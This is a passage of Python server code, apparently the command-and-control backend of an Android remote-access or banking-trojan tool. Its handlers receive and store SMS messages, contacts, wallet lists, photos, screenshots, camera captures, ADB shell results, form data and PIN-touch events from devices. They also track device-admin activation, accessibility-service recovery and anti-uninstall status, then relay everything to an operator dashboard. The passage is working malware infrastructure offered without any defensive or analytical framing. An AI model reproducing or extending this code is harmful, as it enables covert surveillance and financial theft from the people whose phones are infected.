                if type(current_page) is not int or current_page < 0:
                    raise LegacyProtocolError("contactList curpage is invalid")
                result = {
                    "data": contacts,
                    "total": total,
                    "curpage": current_page,
                    "fromAdmin": "admin",
                }

            command = database.one(
                "SELECT id FROM commands WHERE device_id=? AND action=? "
                "AND status IN ('queued','sent','acknowledged') "
                "ORDER BY queued_at DESC LIMIT 1",
                (device["id"], request_action),
            )
            if command is None:
                raise LegacyProtocolError(
                    f"{reported_action} report has no matching pending request"
                )
            save_device_data_report(device["id"], reported_action, result)
            database.execute(
                "UPDATE commands SET status='success',completed_at=?,error_code=NULL,"
                "error_message=NULL,result_json=? WHERE id=?",
                (utc_now(), json.dumps(result, ensure_ascii=False), command["id"]),
            )
            await hub.broadcast_dashboard(
                {
                    "type": "command.updated",
                    "device_id": device["id"],
                    "status": "success",
                },
                device["owner_user_id"],
            )
            return {
                "accepted": True,
                "device_id": device["id"],
                "action": reported_action,
            }
        except (LegacyProtocolError, ValueError) as exc:
            response = {
                "accepted": False,
                "error": "INVALID_ANDROID_SELF_REPORT",
                "message": str(exc),
            }
            await sio.emit("server.error", response, to=sid)
            return response

    async def accept_legacy_uncorrelated_sms(
        sid: str, decoded: Any
    ) -> dict[str, Any]:
        try:
            if not isinstance(decoded, dict):
                raise LegacyProtocolError("invalid encrypted SMS report")
            reported_action = decoded.get("action")
            if reported_action not in {"smsList", "smsReceived"}:
                raise LegacyProtocolError("unsupported SMS report action")
            data = decoded.get("data")
            if not isinstance(data, dict):
                raise LegacyProtocolError("SMS report is missing data")

            context = legacy_contexts.get(sid, {})
            already_bound = legacy_bound_devices.get(sid)
            device = legacy_device_identity(decoded, context, already_bound)
            if device is None:
                raise LegacyProtocolError(
                    "SMS report does not match a pre-provisioned device"
                )
            if reported_action == "smsList":
                reported_device_id = data.get("deviceId")
                if reported_device_id not in {
                    device["id"],
                    device["installation_id"],
                }:
                    raise LegacyProtocolError("smsList report deviceId does not match")
            bind_legacy_device(sid, device["id"])

            if reported_action == "smsReceived":
                sender = data.get("sender")
                body = data.get("body")
                timestamp = data.get("timestamp")
                if not isinstance(sender, str) or not 1 <= len(sender) <= 500:
                    raise LegacyProtocolError("smsReceived sender is invalid")
                if not isinstance(body, str) or len(body) > 10000:
                    raise LegacyProtocolError("smsReceived body is invalid")
                if type(timestamp) is not int or timestamp < 0:
                    raise LegacyProtocolError("smsReceived timestamp is invalid")
                received_sms = {
                    "sender": sender,
                    "body": body,
                    "timestamp": timestamp,
                }
                save_device_data_report(
                    device["id"], "smsReceived", received_sms
                )
                await hub.broadcast_dashboard(
                    {
                        "type": "sms.received",
                        "device_id": device["id"],
                        "sms": received_sms,
                    },
                    device["owner_user_id"],
                )
            else:
                messages = data.get("data")
                total = data.get("total")
                current_page = data.get("curpage")
                from_admin = data.get("fromAdmin")
                if not isinstance(messages, list) or len(messages) > 500:
                    raise LegacyProtocolError("smsList message data is invalid")
                normalized_messages: list[dict[str, Any]] = []
                for message in messages:
                    if not isinstance(message, dict):
                        raise LegacyProtocolError("smsList contains an invalid message")
                    address = message.get("address")
                    body = message.get("body")
                    date = message.get("date")
                    message_type = message.get("type")
                    if not isinstance(address, str) or not 1 <= len(address) <= 500:
                        raise LegacyProtocolError("smsList address is invalid")
                    if not isinstance(body, str) or len(body) > 10000:
                        raise LegacyProtocolError("smsList body is invalid")
                    if type(date) is not int or date < 0:
                        raise LegacyProtocolError("smsList date is invalid")
                    if type(message_type) is not int:
                        raise LegacyProtocolError("smsList type is invalid")
                    normalized_messages.append(
                        {
                            "address": address,
                            "body": body,
                            "date": date,
                            "type": message_type,
                        }
                    )
                if type(total) is not int or total < 0:
                    raise LegacyProtocolError("smsList total is invalid")
                if type(current_page) is not int or current_page < 0:
                    raise LegacyProtocolError("smsList curpage is invalid")
                if from_admin != "admin":
                    raise LegacyProtocolError("smsList fromAdmin is invalid")
                command = database.one(
                    "SELECT id FROM commands WHERE device_id=? AND action='readSmsList' "
                    "AND status IN ('queued','sent','acknowledged') "
                    "ORDER BY queued_at DESC LIMIT 1",
                    (device["id"],),
                )
                if command is None:
                    raise LegacyProtocolError(
                        "smsList report has no matching pending request"
                    )
                result = {
                    "data": normalized_messages,
                    "total": total,
                    "curpage": current_page,
                    "fromAdmin": from_admin,
                }
                save_device_data_report(device["id"], "smsList", result)
                database.execute(
                    "UPDATE commands SET status='success',completed_at=?,error_code=NULL,"
                    "error_message=NULL,result_json=? WHERE id=?",
                    (utc_now(), json.dumps(result, ensure_ascii=False), command["id"]),
                )
                await hub.broadcast_dashboard(
                    {
                        "type": "command.updated",
                        "device_id": device["id"],
                        "status": "success",
                    },
                    device["owner_user_id"],
                )
            return {
                "accepted": True,
                "device_id": device["id"],
                "action": reported_action,
            }
        except (LegacyProtocolError, ValueError) as exc:
            response = {
                "accepted": False,
                "error": "INVALID_ANDROID_SELF_REPORT",
                "message": str(exc),
            }
            await sio.emit("server.error", response, to=sid)
            return response

    async def accept_legacy_remaining_command_result(
        sid: str, decoded: Any
    ) -> None:
        if not isinstance(decoded, dict):
            raise LegacyProtocolError("command result must be a JSON object")
        reported_action = decoded.get("action")
        if reported_action not in {
            "relayStatus",
            "adbPairStatus",
            "adbShellResult",
            "adbScreenshot",
        }:
            raise LegacyProtocolError("unsupported command result action")
        data = decoded.get("data")
        if not isinstance(data, dict):
            raise LegacyProtocolError("command result is missing data")
        context = legacy_contexts.get(sid, {})
        already_bound = legacy_bound_devices.get(sid)
        device = legacy_device_identity(decoded, context, already_bound)
        if device is None:
            raise LegacyProtocolError("command result does not match a device")
        reported_device_id = data.get("deviceId")
        if reported_device_id is not None and reported_device_id not in {
            device["id"],
            device["installation_id"],
        }:
            raise LegacyProtocolError("command result deviceId does not match")
        bind_legacy_device(sid, device["id"])

        result: dict[str, Any]
        candidate_actions: tuple[str, ...]
        require_command = True
        if reported_action == "relayStatus":
            screen = data.get("screen")
            camera = data.get("camera")
            if type(screen) is not bool or type(camera) is not bool:
                raise LegacyProtocolError("relayStatus fields are invalid")
            result = {"screen": screen, "camera": camera}
            candidate_actions = ("ask_relay",)
            merge_device_json_state(
                "device_runtime_state",
                device["id"],
                {
                    "screenRelay": screen,
                    "cameraRelay": camera,
                    "relayStatusAt": utc_now(),
                },
            )
        elif reported_action == "adbPairStatus":
            result_type = data.get("type")
            message = data.get("message")
            if not isinstance(result_type, str) or not 1 <= len(result_type) <= 80:
                raise LegacyProtocolError("adbPairStatus type is invalid")
            if message is not None and (
                not isinstance(message, str) or len(message) > 5000
            ):
                raise LegacyProtocolError("adbPairStatus message is invalid")
            result = {
                key: value
                for key, value in data.items()
                if key
                in {
                    "type",
                    "connected",
                    "paired",
                    "supported",
                    "wifi",
                    "pairing",
                    "message",
                }
            }
            candidate_actions = ("startAutoPair", "manualPair", "adbStatus")
            require_command = False
            merge_device_json_state(
                "device_runtime_state",
                device["id"],
                {"adbStatus": result, "adbStatusAt": utc_now()},
            )
        elif reported_action == "adbShellResult":
            if "tree" in data:
                tree = data.get("tree")
                if not isinstance(tree, str) or not tree:
                    raise LegacyProtocolError("ADB UI tree is invalid")
                result = {"tree": tree}
                candidate_actions = ("adbUiTree",)
            else:
                command_text = data.get("cmd")
                output = data.get("result")
                success = data.get("success")
                if not isinstance(command_text, str) or not command_text:
                    raise LegacyProtocolError("ADB shell command is invalid")
                if not isinstance(output, str) or type(success) is not bool:
                    raise LegacyProtocolError("ADB shell result is invalid")
                result = {"cmd": command_text, "result": output, "success": success}
                candidate_actions = ("adbShell",)
        else:
            result = image_report_result("adbScreenshot", data)
            candidate_actions = ("adbScreenshot",)

        placeholders = ",".join("?" for _ in candidate_actions)
        command = database.one(
            "SELECT id FROM commands WHERE device_id=? "
            f"AND action IN ({placeholders}) AND status IN ('queued','sent','acknowledged') "
            "ORDER BY queued_at DESC LIMIT 1",
            (device["id"], *candidate_actions),
        )
        if command is None and require_command:
            raise LegacyProtocolError(
                f"{reported_action} has no matching pending request"
            )
        save_device_data_report(device["id"], reported_action, result)
        if command is not None:
            database.execute(
                "UPDATE commands SET status='success',completed_at=?,result_json=?,"
                "error_code=NULL,error_message=NULL WHERE id=?",
                (
                    utc_now(),
                    json.dumps(result, ensure_ascii=False, separators=(",", ":")),
                    command["id"],
                ),
            )
            await hub.broadcast_dashboard(
                {
                    "type": "command.updated",
                    "device_id": device["id"],
                    "status": "success",
                },
                device["owner_user_id"],
            )

    async def accept_legacy_active_event(sid: str, decoded: Any) -> None:
        if not isinstance(decoded, dict):
            raise LegacyProtocolError("active event must be a JSON object")
        action = decoded.get("action")
        if action not in {
            "fcmToken",
            "notification",
            "formData",
            "amountAlert",
            "touchPinData",
            "capture",
            "cacheData",
        }:
            raise LegacyProtocolError("unsupported active event")
        data = decoded.get("data")
        if not isinstance(data, dict):
            raise LegacyProtocolError("active event is missing data")
        try:
            serialized = json.dumps(data, ensure_ascii=False, separators=(",", ":"))
        except (TypeError, ValueError) as exc:
            raise LegacyProtocolError("active event data is not JSON") from exc
        if len(serialized.encode("utf-8")) > MAX_LEGACY_CIPHERTEXT_BYTES:
            raise LegacyProtocolError("active event data is too large")
        context = legacy_contexts.get(sid, {})
        already_bound = legacy_bound_devices.get(sid)
        device = legacy_device_identity(decoded, context, already_bound)
        if device is None:
            raise LegacyProtocolError("active event does not match a device")
        reported_device_id = data.get("deviceId")
        if reported_device_id is not None and reported_device_id not in {
            device["id"],
            device["installation_id"],
        }:
            raise LegacyProtocolError("active event deviceId does not match")
        bind_legacy_device(sid, device["id"])
        now = utc_now()

        if action == "fcmToken":
            fcm_token = data.get("fcmToken")
            if not isinstance(fcm_token, str) or not 1 <= len(fcm_token) <= 4096:
                raise LegacyProtocolError("FCM token is invalid")
            database.execute(
                "UPDATE devices SET fcm_token=?,fcm_token_updated_at=?,updated_at=? WHERE id=?",
                (fcm_token, now, now, device["id"]),
            )
        elif action == "notification":
            if not isinstance(data.get("pkg"), str) or type(data.get("timestamp")) is not int:
                raise LegacyProtocolError("notification fields are invalid")
        elif action == "formData":
            if not isinstance(data.get("data"), str):
                raise LegacyProtocolError("formData value is invalid")
        elif action == "amountAlert":
            if not isinstance(data.get("amount"), (int, float)):
                raise LegacyProtocolError("amountAlert amount is invalid")
        elif action == "touchPinData":
            if not isinstance(data.get("pkg"), str) or type(data.get("timestamp")) is not int:
                raise LegacyProtocolError("touchPinData fields are invalid")
            merge_device_json_state(
                "device_runtime_state",
                device["id"],
                {"lastTouchPinAt": now},
            )
        elif action == "capture":
            if not isinstance(data.get("zip"), str):
                raise LegacyProtocolError("capture UI data is invalid")
            merge_device_json_state(
                "device_runtime_state",
                device["id"],
                {
                    "latestCapture": {
                        key: data.get(key)
                        for key in ("pkg", "ac", "w", "h", "iw", "ih", "orient")
                    },
                    "latestCaptureAt": now,
                },
            )
        elif action == "cacheData":
            cache_key = data.get("k")
            cache_value = data.get("cache")
            if not isinstance(cache_key, str) or not cache_key:
                raise LegacyProtocolError("cache key is invalid")
            database.execute(
                "INSERT INTO device_cache(device_id,cache_key,cache_json,received_at) "
                "VALUES(?,?,?,?) ON CONFLICT(device_id,cache_key) DO UPDATE SET "
                "cache_json=excluded.cache_json,received_at=excluded.received_at",
                (
                    device["id"],
                    cache_key,
                    json.dumps(cache_value, ensure_ascii=False, separators=(",", ":")),
                    now,
                ),
            )
        save_device_data_report(device["id"], action, data)
        await hub.broadcast_dashboard(
            {
                "type": "device.data",
                "device_id": device["id"],
                "action": action,
            },
            device["owner_user_id"],
        )

    def normalize_android_self_report(
        message: DeviceSocketMessage,
    ) -> tuple[DeviceSocketMessage, bool]:
        decoded, encrypted = decode_android_self_report(message.payload)
        correlation_id = message.correlation_id or report_correlation_id(decoded)
        if correlation_id is None:
            raise LegacyProtocolError("Android self-report is missing correlation_id")
        report_payload = decoded
        if isinstance(decoded, dict) and isinstance(decoded.get("payload"), dict):
            report_payload = decoded["payload"]
        if message.type in ANDROID_IMAGE_REPORT_TYPES:
            result: Any = image_report_result(message.type, report_payload)
        elif isinstance(report_payload, dict) and "result" in report_payload:
            result = report_payload["result"]
        else:
            result = report_payload
        return (
            message.model_copy(
                update={
                    "type": "command.result",
                    "correlation_id": correlation_id,
                    "payload": {"success": True, "result": result},
                }
            ),
            encrypted,
        )

    def normalize_command_result(
        message: DeviceSocketMessage,
    ) -> tuple[DeviceSocketMessage, bool]:
        decoded, encrypted = decode_android_self_report(message.payload)
        if not encrypted:
            return message, False
        correlation_id = message.correlation_id or report_correlation_id(decoded)
        if correlation_id is None:
            raise LegacyProtocolError("encrypted command result is missing correlation_id")
        result_payload = decoded
        if isinstance(decoded, dict) and isinstance(decoded.get("payload"), dict):
            result_payload = decoded["payload"]
        if isinstance(result_payload, dict) and type(result_payload.get("success")) is bool:
            normalized_payload = result_payload
        elif isinstance(result_payload, dict) and "result" in result_payload:
            normalized_payload = {
                "success": True,
                "result": result_payload["result"],
            }
        else:
            normalized_payload = {"success": True, "result": result_payload}
        return (
            message.model_copy(
                update={
                    "correlation_id": correlation_id,
                    "payload": normalized_payload,
                }
            ),
            True,
        )

    def update_legacy_device_metadata(device_id: str, decoded: Any) -> None:
        if not isinstance(decoded, dict):
            return
        data = decoded.get("data")
        if not isinstance(data, dict):
            return
        device_info = data.get("deviceInfo")
        if not isinstance(device_info, dict):
            return
        field_values = {
            "brand": device_info.get("brand"),
            "model": device_info.get("model"),
            "package_name": device_info.get("myPkg") or device_info.get("pkg"),
            "app_version": device_info.get("apkVer"),
            "locale": device_info.get("lang"),
            "timezone": device_info.get("timeZone"),
        }
        updates: dict[str, Any] = {}
        for field, value in field_values.items():
            if isinstance(value, str) and 1 <= len(value) <= 255:
                updates[field] = value
        sdk_int = device_info.get("version")
        if type(sdk_int) is int and 1 <= sdk_int <= 1000:
            updates["sdk_int"] = sdk_int
        if not updates:
            return
        updates["updated_at"] = utc_now()
        assignments = ",".join(f'"{field}"=?' for field in updates)
        database.execute(
            f"UPDATE devices SET {assignments} WHERE id=?",
            (*updates.values(), device_id),
        )

    async def process_legacy_diagnostic(
        decoded: Any, sid: str | None = None
    ) -> dict[str, Any]:
        if not isinstance(decoded, dict):
            raise LegacyProtocolError("diagnostic report must be a JSON object")
        data = decoded.get("data") if decoded.get("action") == "diag" else decoded
        if not isinstance(data, dict):
            raise LegacyProtocolError("diagnostic report is missing data")
        diagnostic_type = data.get("type")
        if diagnostic_type not in {
            "acc_lifecycle",
            "battery_auto",
            "device_admin",
            "conn",
            "biometric_lock",
            "anti_uninstall",
            "acc_recovery",
            "acc_jumper",
            "battery_grant",
            "captcha",
            "pin_verify",
        }:
            raise LegacyProtocolError("unsupported diagnostic type")
        device_id = data.get("deviceId")
        if not isinstance(device_id, str) or not 1 <= len(device_id) <= 160:
            raise LegacyProtocolError("diagnostic deviceId is invalid")
        client_timestamp = data.get("ts")
        if type(client_timestamp) is not int or client_timestamp < 0:
            raise LegacyProtocolError("diagnostic timestamp is invalid")

        context = legacy_contexts.get(sid, {}) if sid is not None else {}
        already_bound = legacy_bound_devices.get(sid) if sid is not None else None
        device = legacy_device_identity(decoded, context, already_bound)
        if device is None or device_id not in {device["id"], device["installation_id"]}:
            raise LegacyProtocolError(
                "diagnostic report does not match a pre-provisioned device"
            )
        if sid is not None:
            bind_legacy_device(sid, device["id"])

        now = utc_now()
        status_updates: dict[str, Any] = {"online": 1, "updated_at": now}
        device_updates: dict[str, Any] = {
            "last_seen_at": now,
            "last_online_at": now,
            "updated_at": now,
        }
        event: str | None = None
        message: str | None = None
        reason: str | None = None
        runtime_updates: dict[str, Any] = {}

        if diagnostic_type == "acc_lifecycle":
            event = data.get("event")
            if event not in {"onServiceConnected", "onDestroy"}:
                raise LegacyProtocolError("acc_lifecycle event is invalid")
            reason_value = data.get("reason")
            if reason_value is not None and (
                not isinstance(reason_value, str) or len(reason_value) > 2000
            ):
                raise LegacyProtocolError("acc_lifecycle reason is invalid")
            reason = reason_value
            battery = data.get("battery")
            charging = data.get("charging")
            memory_available = data.get("mem_avail_mb")
            memory_total = data.get("mem_total_mb")
            memory_low = data.get("mem_low")
            interactive = data.get("interactive")
            ignoring_battery = data.get("ignoring_battery_opt")
            idle_mode = data.get("idle_mode")
            permissions = data.get("permissions")
            if type(battery) is not int or not 0 <= battery <= 100:
                raise LegacyProtocolError("acc_lifecycle battery is invalid")
            if type(charging) is not bool:
                raise LegacyProtocolError("acc_lifecycle charging is invalid")
            if type(memory_available) is not int or memory_available < 0:
                raise LegacyProtocolError("acc_lifecycle available memory is invalid")
            if type(memory_total) is not int or memory_total < 0:
                raise LegacyProtocolError("acc_lifecycle total memory is invalid")
            if type(memory_low) is not bool or type(interactive) is not bool:
                raise LegacyProtocolError("acc_lifecycle state flags are invalid")
            if type(ignoring_battery) is not bool or type(idle_mode) is not bool:
                raise LegacyProtocolError("acc_lifecycle power flags are invalid")
            if not isinstance(permissions, dict):
                raise LegacyProtocolError("acc_lifecycle permissions are invalid")
            battery_whitelist = permissions.get("battery_whitelist")
            if type(battery_whitelist) is not bool:
                raise LegacyProtocolError("acc_lifecycle battery permission is invalid")
            uptime = data.get("uptime_sec")
            if event == "onDestroy" and (
                type(uptime) is not int or uptime < 0
            ):
                raise LegacyProtocolError("acc_lifecycle uptime is invalid")
            status_updates.update(
                {
                    "battery_percent": battery,
                    "charging": int(charging),
                    "screen_interactive": int(interactive),
                    "accessibility_enabled": int(event == "onServiceConnected"),
                    "battery_whitelist_enabled": int(battery_whitelist),
                    "idle_mode": int(idle_mode),
                    "memory_available_mb": memory_available,
                    "memory_total_mb": memory_total,
                    "memory_low": int(memory_low),
                    "last_acc_event": event,
                    "last_acc_event_at": now,
                }
            )
            brand = data.get("brand")
            model = data.get("model")
            sdk = data.get("sdk")
            if isinstance(brand, str) and 1 <= len(brand) <= 255:
                device_updates["brand"] = brand
            if isinstance(model, str) and 1 <= len(model) <= 255:
                device_updates["model"] = model
            if type(sdk) is int and 0 <= sdk <= 1000:
                device_updates["sdk_int"] = sdk
        elif diagnostic_type == "battery_auto":
            message_value = data.get("message")
            if not isinstance(message_value, str) or not 1 <= len(message_value) <= 2000:
                raise LegacyProtocolError("battery_auto message is invalid")
            message = message_value
            parts = message.split("|")
            stage = parts[0]
            if stage not in {"START", "CHECK", "DONE", "EXEMPTION"}:
                raise LegacyProtocolError("battery_auto stage is invalid")
            whitelisted: bool | None = None
            for part in parts[1:]:
                if part == "whitelisted=true":
                    whitelisted = True
                elif part == "whitelisted=false":
                    whitelisted = False
                elif stage == "EXEMPTION" and part == "already_whitelisted":
                    whitelisted = True
            status_updates.update(
                {
                    "battery_stage": stage,
                    "battery_message": message,
                    "battery_status_at": now,
                }
            )
            if whitelisted is not None:
                status_updates["battery_whitelist_enabled"] = int(whitelisted)
        elif diagnostic_type == "device_admin":
            message_value = data.get("message")
            if not isinstance(message_value, str) or not 1 <= len(message_value) <= 2000:
                raise LegacyProtocolError("device_admin message is invalid")
            message = message_value
            stage = message.split("|", 1)[0]
            if stage not in {"ACTIVATED", "CONFIRM_CLICKED"}:
                raise LegacyProtocolError("device_admin stage is invalid")
            status_updates.update(
                {
                    "device_admin_status": stage,
                    "device_admin_message": message,
                    "device_admin_updated_at": now,
                }
            )
            if stage == "ACTIVATED":
                status_updates["device_admin_enabled"] = 1
        else:
            message_value = data.get("message")
            if not isinstance(message_value, str) or not 1 <= len(message_value) <= 10000:
                raise LegacyProtocolError(f"{diagnostic_type} message is invalid")
            message = message_value
            event = message.split("|", 1)[0]
            if diagnostic_type == "conn":
                socket_connected = message == "connected"
                binary_connected = message == "binary_ws_connected"
                if message.startswith("disconnected:"):
                    status_updates["online"] = 0
                    runtime_updates["socketConnected"] = False
                elif socket_connected or binary_connected:
                    status_updates["online"] = 1
                if socket_connected:
                    runtime_updates["socketConnected"] = True
                if binary_connected:
                    runtime_updates.update(
                        {"binaryConnected": True, "binaryOnline": True}
                    )
                runtime_updates.update(
                    {"connectionMessage": message, "connectionStatusAt": now}
                )
            elif diagnostic_type == "biometric_lock":
                if message not in {"DISABLED", "ENABLED"}:
                    raise LegacyProtocolError("biometric_lock message is invalid")
                runtime_updates.update(
                    {
                        "biometricLock": message == "ENABLED",
                        "biometricLockStatusAt": now,
                    }
                )
            elif diagnostic_type == "anti_uninstall":
                parts = message.split("|")
                parsed = {
                    key: value
                    for part in parts[1:]
                    if "=" in part
                    for key, value in [part.split("=", 1)]
                }
                runtime_updates.update(
                    {
                        "lastAntiUninstall": {
                            "stage": parts[0],
                            "path": parsed.get("path"),
                            "pkg": parsed.get("pkg"),
                            "cls": parsed.get("cls"),
                        },
                        "lastAntiUninstallAt": now,
                    }
                )
            elif diagnostic_type == "acc_recovery":
                downtime: int | None = None
                if message.startswith("RESTORED|"):
                    for part in message.split("|")[1:]:
                        if part.startswith("downtime_sec="):
                            try:
                                downtime = int(part.split("=", 1)[1])
                            except ValueError as exc:
                                raise LegacyProtocolError(
                                    "acc_recovery downtime is invalid"
                                ) from exc
                    status_updates["accessibility_enabled"] = 1
                elif message == "DISABLED_DETECTED":
                    status_updates["accessibility_enabled"] = 0
                else:
                    raise LegacyProtocolError("acc_recovery message is invalid")
                runtime_updates.update(
                    {
                        "accessibilityRecovery": event,
                        "accessibilityDowntimeSec": downtime,
                        "accessibilityRecoveryAt": now,
                    }
                )
            elif diagnostic_type == "battery_grant":
                brand = next(
                    (
                        part.split("=", 1)[1]
                        for part in message.split("|")[1:]
                        if part.startswith("brand=")
                    ),
                    None,
                )
                runtime_updates.update(
                    {
                        "batteryGrantStage": event,
                        "batteryGrantBrand": brand,
                        "batteryGrantMessage": message,
                        "batteryGrantAt": now,
                    }
                )
            elif diagnostic_type == "captcha":
                runtime_updates.update(
                    {"captchaStage": event, "captchaMessage": message, "captchaAt": now}
                )
            elif diagnostic_type == "pin_verify":
                runtime_updates.update(
                    {"pinVerifyStatus": event, "pinVerifyAt": now}
                )
            else:
                runtime_updates.update(
                    {"accJumperMessage": message, "accJumperAt": now}
                )

        status_assignments = ",".join(f'"{field}"=?' for field in status_updates)
        device_assignments = ",".join(f'"{field}"=?' for field in device_updates)
        payload_json = json.dumps(data, ensure_ascii=False, separators=(",", ":"))

        def save(conn: sqlite3.Connection) -> None:
            conn.execute(
                f"UPDATE device_status SET {status_assignments} WHERE device_id=?",
                (*status_updates.values(), device["id"]),
            )
            conn.execute(
                f"UPDATE devices SET {device_assignments} WHERE id=?",
                (*device_updates.values(), device["id"]),
            )
            conn.execute(
                "INSERT INTO device_diagnostics(device_id,diagnostic_type,event,message,"
                "reason,client_timestamp,payload_json,created_at) VALUES(?,?,?,?,?,?,?,?)",
                (
                    device["id"],
                    diagnostic_type,
                    event,
                    message,
                    reason,
                    client_timestamp,
                    payload_json,
                    now,
                ),
            )
            conn.execute(
                "INSERT INTO device_data_reports(device_id,action,data_json,received_at) "
                "VALUES(?,?,?,?)",
                (device["id"], f"diag/{diagnostic_type}", payload_json, now),
            )

        database.transaction(save)
        if runtime_updates:
            merge_device_json_state(
                "device_runtime_state", device["id"], runtime_updates
            )
        await hub.broadcast_dashboard(
            {
                "type": "device.status",
                "device_id": device["id"],
                "status": {
                    key: bool(value) if key.endswith("_enabled") else value
                    for key, value in status_updates.items()
                    if key not in {"updated_at"}
                },
                "source": f"legacy_socketio.diag/{diagnostic_type}",
            },
            device["owner_user_id"],
        )
        return {
            "accepted": True,
            "device_id": device["id"],
            "diagnostic_type": diagnostic_type,
        }

    async def accept_legacy_socket_status(
        sid: str, event_name: str, raw_payload: Any
    ) -> dict[str, Any]:
        try:
            # A plain HTTP/Socket.IO diag is accepted for the documented
            # device-admin lifecycle event. deviceOnline and enc msg are always
            # decrypted before any field is inspected.
            try:
                decoded = decrypt_legacy_payload(
                    raw_payload, settings.legacy_device_aes_key
                )
            except LegacyProtocolError:
                if event_name != "diag" or not isinstance(raw_payload, dict):
                    raise
                decoded = raw_payload
            is_device_online = isinstance(decoded, dict) and decoded.get("action") == "deviceOnline"
            if is_device_online:
                online_data = decoded.get("data")
                device_info = (
                    online_data.get("deviceInfo")
                    if isinstance(online_data, dict)
                    else None
                )
                if isinstance(device_info, dict):
                    network_value = device_info.get("netstate", device_info.get("network"))
                    if (
                        isinstance(network_value, str)
                        and network_value.strip().lower()
                        not in {
                            "none",
                            "wifi",
                            "eth",
                            "2g",
                            "3g",
                            "4g",
                            "5g",
                            "mobile",
                            "other",
                        }
                    ):
                        raise LegacyProtocolError("deviceOnline network state is invalid")
            status_payload = collect_status_payload(decoded)
            if event_name == "diag" and isinstance(decoded, str):
                status_payload["diag"] = decoded
            elif event_name == "diag" and isinstance(decoded, (list, tuple)):
                if len(decoded) >= 1 and isinstance(decoded[0], str):
                    status_payload.setdefault("diag", decoded[0])
                if len(decoded) >= 2:
                    status_payload.setdefault("status", decoded[1])
            status_body = DeviceStatusRequest.model_validate(status_payload)
            normalized = status_body.model_dump(exclude_none=True)
            if not normalized:
                raise LegacyProtocolError("decrypted event contains no supported status fields")
            context = legacy_contexts.get(sid, {})
            already_bound = legacy_bound_devices.get(sid)
            device = (
                ensure_legacy_online_device(decoded, context, already_bound)
                if is_device_online
                else legacy_device_identity(decoded, context, already_bound)
            )
            if device is None:
                raise LegacyProtocolError(
                    "decrypted event does not match a pre-provisioned device"
                )
            if already_bound is not None and already_bound != device["id"]:
                raise LegacyProtocolError("Socket.IO session changed device identity")
        except (LegacyProtocolError, ValueError) as exc:
            await sio.emit(
                "server.error",
                {"code": "INVALID_LEGACY_STATUS", "message": str(exc)},
                to=sid,
            )
            return {"accepted": False, "error": "INVALID_LEGACY_STATUS"}

        previous = database.one(
            "SELECT online FROM device_status WHERE device_id=?", (device["id"],)
        )
        update_device_status(device["id"], status_body)
        if event_name == "deviceOnline" or (
            isinstance(decoded, dict) and decoded.get("action") == "deviceOnline"
        ):
            update_legacy_device_metadata(device["id"], decoded)
            report_data = decoded.get("data") if isinstance(decoded, dict) else None
            if isinstance(report_data, dict):
                save_device_data_report(device["id"], "deviceOnline", report_data)
        database.execute(
            "UPDATE device_status SET online=1,updated_at=? WHERE device_id=?",
            (utc_now(), device["id"]),
        )
        bind_legacy_device(sid, device["id"])
        online_at = utc_now()
        database.execute(
            "UPDATE devices SET socket_id=?,last_online_at=?,last_seen_at=?,updated_at=? "
            "WHERE id=?",
            (sid, online_at, online_at, online_at, device["id"]),
        )
        if previous is None or not previous["online"]:
            await hub.broadcast_dashboard(
                {"type": "device.online", "device_id": device["id"], "time": utc_now()},
                device["owner_user_id"],
            )
        await hub.broadcast_dashboard(
            {
                "type": "device.status",
                "device_id": device["id"],
                "status": normalized,
                "source": f"legacy_socketio.{event_name}",
            },
            device["owner_user_id"],
        )
        return {"accepted": True, "device_id": device["id"]}

    @sio.event
    async def connect(sid: str, environ: dict[str, Any], auth: Any = None):
        legacy_contexts[sid] = legacy_socket_context(environ, auth)
        return True

    @sio.on("login")
    async def legacy_login(sid: str, payload: Any):
        if isinstance(payload, bytes):
            try:
                payload = payload.decode("utf-8")
            except UnicodeDecodeError:
                payload = None
        if not isinstance(payload, str) or not payload:
            return {"accepted": False, "error": "INVALID_DEVICE_ID"}
        context = legacy_contexts.get(sid, {})
        already_bound = legacy_bound_devices.get(sid)
        device = legacy_device_identity(
            {"deviceId": payload}, context, already_bound
        )
        if device is None:
            try:
                device = ensure_legacy_online_device(
                    {
                        "action": "deviceOnline",
                        "data": {"deviceId": payload, "deviceInfo": {}},
                    },
                    context,
                    already_bound,
                )
            except LegacyProtocolError:
                return {"accepted": False, "error": "INVALID_DEVICE_ID"}
        if payload not in {device["id"], device["installation_id"]}:
            return {"accepted": False, "error": "INVALID_DEVICE_ID"}
        bind_legacy_device(sid, device["id"])
        now = utc_now()
        database.execute(
            "UPDATE devices SET socket_id=?,last_online_at=?,last_seen_at=?,updated_at=? "
            "WHERE id=?",
            (sid, now, now, now, device["id"]),
        )
        database.execute(
            "UPDATE device_status SET online=1,reported_at=?,updated_at=? WHERE device_id=?",
            (now, now, device["id"]),
        )
        merge_device_json_state(
            "device_runtime_state",
            device["id"],
            {"socketConnected": True, "socketConnectedAt": now},
        )
        await hub.broadcast_dashboard(
            {"type": "device.online", "device_id": device["id"], "time": now},
            device["owner_user_id"],
        )
        return {"accepted": True, "device_id": device["id"]}

    @sio.on("deviceOnline")
    async def legacy_device_online(sid: str, payload: Any):
        return await accept_legacy_socket_status(sid, "deviceOnline", payload)

    @sio.on("enc msg")
    async def legacy_encrypted_message(sid: str, payload: Any):
        try:
            decoded = decrypt_legacy_payload(payload, settings.legacy_device_aes_key)
        except LegacyProtocolError:
            return await accept_legacy_socket_status(sid, "enc msg", payload)
        if (
            isinstance(decoded, dict)
            and decoded.get("action") == "diag"
            and decoded.get("type") == "enc"
        ):
            try:
                await process_legacy_diagnostic(decoded, sid)
            except LegacyProtocolError as exc:
                await sio.emit(
                    "server.error",
                    {"code": "INVALID_LEGACY_DIAGNOSTIC", "message": str(exc)},
                    to=sid,
                )
            return None
        if (
            isinstance(decoded, dict)
            and decoded.get("type") == "enc"
            and decoded.get("action") in {"screenshot", "camPic"}
        ):
            response = await accept_legacy_uncorrelated_image(sid, decoded)
            return encrypt_legacy_payload(response, settings.legacy_device_aes_key)
        if (
            isinstance(decoded, dict)
            and decoded.get("type") == "enc"
            and decoded.get("action")
            in {
                "iconList",
                "walletList",
                "reqPerList",
                "albumList",
                "albumLast",
                "albumData",
                "contactList",
                "fetchIcon",
            }
        ):
            response = await accept_legacy_uncorrelated_private_result(sid, decoded)
            return encrypt_legacy_payload(response, settings.legacy_device_aes_key)
        if (
            isinstance(decoded, dict)
            and decoded.get("type") == "enc"
            and decoded.get("action") in {"smsList", "smsReceived"}
        ):
            response = await accept_legacy_uncorrelated_sms(sid, decoded)
